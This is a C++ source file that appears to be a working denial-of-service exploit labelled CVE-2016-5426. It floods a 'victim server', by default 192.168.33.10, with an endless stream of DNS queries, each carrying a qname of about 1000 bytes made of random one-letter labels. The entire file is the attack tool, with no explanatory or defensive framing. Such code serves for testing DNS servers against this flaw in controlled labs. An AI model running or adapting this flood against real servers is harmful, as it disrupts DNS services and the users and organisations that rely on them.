#include "dns.hpp"
#include "dns.hpp"
#include "udpv4client.hpp"
#include "utils.hpp"
#include <time.h>
#include <algorithm>
#include <arpa/inet.h>
#include <boost/program_options.hpp>
#include <boost/numeric/conversion/cast.hpp>
#include <cstdio>
#include <cstring>
#include <iostream>
#include <iostream>
#include <iterator>
#include <sstream>
#include <stdexcept>
#include <unistd.h>

const char         *DEFAULT_TARGET_SERVER       = "192.168.33.10";
const uint32_t      DEFAULT_PERIOD_MICRO_SECOND = 10 * 1000;
const unsigned int  DEFAULT_QNAME_LENGTH        = 1000;


int main( int argc, char **argv )
{
    namespace po = boost::program_options;

    std::string        target;
    unsigned int       period;
    uint32_t           qname_length;

    po::options_description desc( "cve-2016-5426" );
    desc.add_options()( "help,h", "print this message" )

        ( "target,t", po::value<std::string>( &target )->default_value( DEFAULT_TARGET_SERVER ), "victim server" )

        ( "period,p",
	  po::value<unsigned int>( &period )->default_value( DEFAULT_PERIOD_MICRO_SECOND ),
	  "period[micro second]" )

        ( "length,l", po::value<uint32_t>( &qname_length )->default_value( DEFAULT_QNAME_LENGTH ), "qname length" );

    po::variables_map vm;
    po::store( po::parse_command_line( argc, argv, desc ), vm );
    po::notify( vm );

    if ( vm.count( "help" ) ) {
        std::cerr << desc << "\n";
        return 1;
    }

    std::srand( time( NULL ) );
    
    udpv4::ClientParameters udp_param;
    udp_param.destination_address = target;
    udp_param.destination_port    = 53;
    udpv4::Client udp( udp_param );

    while ( true ) {
	dns::Domainname qname;
	for ( ; qname.size() < qname_length ; ) {
	    std::string label;
	    label.push_back( rand()%26 + 'a' );
	    qname.addSubdomain( label );
	}

        dns::PacketInfo query;
	query.id                   = rand()&0xffff;
	query.opcode               = 0;
	query.query_response       = 0;
	query.authoritative_answer = 0;
	query.truncation           = 0;
	query.recursion_desired    = 1;
	query.recursion_available  = 0;
	query.zero_field           = 0;
	query.authentic_data       = 0;
	query.checking_disabled    = 0;
	query.response_code        = 0;

	dns::QuestionSectionEntry question;
	question.q_domainname = qname;
	question.q_type       = dns::TYPE_A;
	question.q_class      = dns::CLASS_IN;
	query.question_section.push_back( question );

	WireFormat message;
	query.generateMessage( message );
	udp.sendPacket( message );
	usleep( period );
    }
    
    return 0;
}
